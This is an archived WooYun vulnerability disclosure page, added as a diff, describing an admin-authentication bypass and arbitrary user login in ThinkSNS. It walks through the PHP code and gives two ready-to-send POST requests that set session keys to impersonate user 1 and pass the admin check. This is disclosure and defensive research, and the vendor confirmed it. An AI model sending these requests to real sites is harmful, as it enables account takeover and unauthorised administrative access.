@@ -1,0 +1,292 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ThinkSNS任意用户登陆+后台管理绕过  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ThinkSNS任意用户登陆+后台管理绕过  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪头子">猪头子</a> 
+</li><li>提交时间：		2013-11-15 22:56</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-15：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-20：	细节向第三方安全合作伙伴开放<br/>
+									2013-11-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-07：	细节向普通白帽子公开<br/>
+									2013-12-27：	细节向实习白帽子公开<br/>
+									2014-02-13：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">大概三个月前找到的，没想到还是没补</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">在/apps/page/Lib/Action/DiyAction.class.php 205行 setSession函数：<br />
+<br />
+</p><pre><code>public function setSession() {<br />
+          echo $_SESSION [ $_POST [&#039;name&#039;] ]  = base64_encode( $_POST [&#039;layout&#039;]) ;<br />
+     }</code></pre><p class='detail'><br />
+<br />
+setSession函数用POST传入的name和base64编码的layout为$_SESSION赋值。<br />
+<br />
+在/apps/admin/Lib/Action/AdministratorAction.class.php的_initialize函数是负责判断当前用户是否有后台管理员权限的：<br />
+<br />
+</p><pre><code>public function _initialize()<br />
+    {<br />
+        if(!model(&#039;Passport&#039;)-&gt;checkAdminLogin()){<br />
+            redirect(U(&#039;admin/Public/login&#039;));<br />
+        }<br />
+        $this-&gt;systemdata_list = APP_NAME.&#039;_&#039;.MODULE_NAME;<br />
+          $this-&gt;systemdata_key  = ACTION_NAME;<br />
+        $this-&gt;pageKey = APP_NAME.&#039;_&#039;.MODULE_NAME.&#039;_&#039;.ACTION_NAME;<br />
+        $this-&gt;searchPageKey = &#039;S_&#039;.APP_NAME.&#039;_&#039;.MODULE_NAME.&#039;_&#039;.ACTION_NAME;<br />
+        $this-&gt;savePostUrl = U(&#039;admin/Index/saveConfigData&#039;);<br />
+        $this-&gt;searchPostUrl = U(APP_NAME.&#039;/&#039;.MODULE_NAME.&#039;/&#039;.ACTION_NAME);<br />
+        $this-&gt;submitAlias = L(&#039;PUBLIC_SAVE&#039;);<br />
+        $this-&gt;assign(&#039;isAdmin&#039;,1);<br />
+        $this-&gt;onload[] = &#039;admin.bindTrOn()&#039;;<br />
+        $this-&gt;getSearchPost(); //默认初始化post查询  <br />
+       <br />
+        if(!CheckPermission(&#039;core_admin&#039;,&#039;admin_login&#039;)){<br />
+            $this-&gt;assign(&#039;jumpUrl&#039;,SITE_URL);<br />
+            $this-&gt;error(L(&#039;PUBLIC_NO_FRONTPLATFORM_PERMISSION_ADMIN&#039;));<br />
+        }<br />
+        $this-&gt;navList = model(&#039;Xdata&#039;)-&gt;get(&#039;admin_nav:top&#039;);<br />
+    }</code></pre><p class='detail'><br />
+<br />
+有两个点是验证权限的地方，跟进去<br />
+<br />
+先看checkAdminLogin函数<br />
+<br />
+/addons/model/PassportModel.class.php checkAdminLogin()<br />
+<br />
+</p><pre><code>/**<br />
+     * 验证后台登录<br />
+     * @return boolean 是否已经登录后台<br />
+     */<br />
+     public function checkAdminLogin() {<br />
+          if($_SESSION[&#039;adminLogin&#039;]) {<br />
+               return true;<br />
+          } else {<br />
+               return false;<br />
+          }<br />
+     }</code></pre><p class='detail'><br />
+<br />
+这段代码判断若$_SESSION[&#039;adminLogin&#039;]存在那么直接返回true，因此可以通过前面的setSession函数设置一下$_SESSION[&#039;adminLogin&#039;]就可以了，不必关心它的值。<br />
+<br />
+看CheckPermission函数：<br />
+<br />
+/core\OpenSociax\functions.inc.php:987<br />
+<br />
+</p><pre><code>/**<br />
+* 验证权限方法<br />
+* @param string $load 应用 - 模块 字段<br />
+* @param string $action 权限节点字段<br />
+* @param unknown_type $group 是否指定应用内部用户组<br />
+*/<br />
+function CheckPermission($load = &#039;&#039;, $action = &#039;&#039;, $group = &#039;&#039;){<br />
+    if(empty($load) || empty($action)) {<br />
+        return false;<br />
+    }<br />
+    $Permission = model(&#039;Permission&#039;)-&gt;load($load);<br />
+    if(!empty($group)){<br />
+        return $Permission-&gt;group($group)-&gt;check($action);<br />
+    }<br />
+    return $Permission-&gt;check($action);<br />
+}</code></pre><p class='detail'><br />
+<br />
+在跟踪的时候会进入$Permission-&gt;check($action)，因此继续跟下去：<br />
+<br />
+/addons/model/PermissionModel.class.php<br />
+<br />
+</p><pre><code>/**<br />
+     * 验证权限<br />
+     * @param string $action 动作节点<br />
+     * @return boolean 是否具有该动作节点的权限<br />
+     */<br />
+     public function check($action) {<br />
+          // 验证时载入当前应用 - 模块的权限<br />
+          if(empty($this-&gt;option[&#039;app&#039;]) || empty($this-&gt;option[&#039;module&#039;])) {<br />
+               return false;<br />
+          }<br />
+          // 判断是否为扩展应用<br />
+          if(!in_array($this-&gt;option[&#039;app&#039;], array(&#039;core&#039;))) {<br />
+               // 判断应用是否关闭<br />
+               $isOpen = model(&#039;App&#039;)-&gt;isAppNameOpen(strtolower($this-&gt;option[&#039;app&#039;]));<br />
+               if(!$isOpen) {<br />
+                    return false;<br />
+               }<br />
+          }<br />
+         <br />
+          $permission = $this-&gt;loadRule($GLOBALS[&#039;ts&#039;][&#039;mid&#039;]);<br />
+<br />
+          if(isset($permission[$this-&gt;option[&#039;app&#039;]][$this-&gt;option[&#039;module&#039;]][$action])) {<br />
+               return true;<br />
+          }<br />
+<br />
+          return false;<br />
+     }</code></pre><p class='detail'><br />
+<br />
+$GLOBALS[&#039;ts&#039;][&#039;mid&#039;]的值是当前用户的id，loadRule函数根据这个从系统中读取当前id用户所拥有的权限，我们需要把这里的mid改1才能通过校验。<br />
+<br />
+于是在程序入口找了一遍$GLOBALS[&#039;ts&#039;][&#039;mid&#039;]是怎么被赋值的：<br />
+<br />
+/core/OpenSociax/Action.class.php:<br />
+<br />
+</p><pre><code>//当前登录者uid<br />
+$GLOBALS[&#039;ts&#039;][&#039;mid&#039;] = $this-&gt;mid = intval($_SESSION[&#039;mid&#039;]);</code></pre><p class='detail'><br />
+<br />
+这里使用了intval从session中取出mid放到globals里面。<br />
+<br />
+需要注意的是intval的原理，截取第一个数字作为函数的返回值，如intval(&#039;1a&#039;)=1,intval(&#039;a&#039;)=0,intval(&#039;a1a&#039;)=0<br />
+<br />
+然后找到%D5的base64编码是1开头的，所以给$_SESSION[&#039;mid&#039;]设置为%D5 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">1. POST index.php?app=page&amp;mod=Diy&amp;act=setSession<br />
+<br />
+         name=mid&amp;layout=%D4<br />
+<br />
+2. POST index.php?app=page&amp;mod=Diy&amp;act=setSession<br />
+<br />
+         name=adminLogin&amp;layout=test<br />
+<br />
+</p><p class="detail"><a href="../images/152223368918ab00bfa59daed147dcca9266015c.jpg" target="_blank"><img src="../images/152223368918ab00bfa59daed147dcca9266015c.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">至少对这个函数做下限制吧，不允许用户提交key </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪头子" title="猪头子">猪头子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043033" title="ThinkSNS任意用户登陆+后台管理绕过">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-11-17 02:33</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢，一个非常严重的漏洞。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43033";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
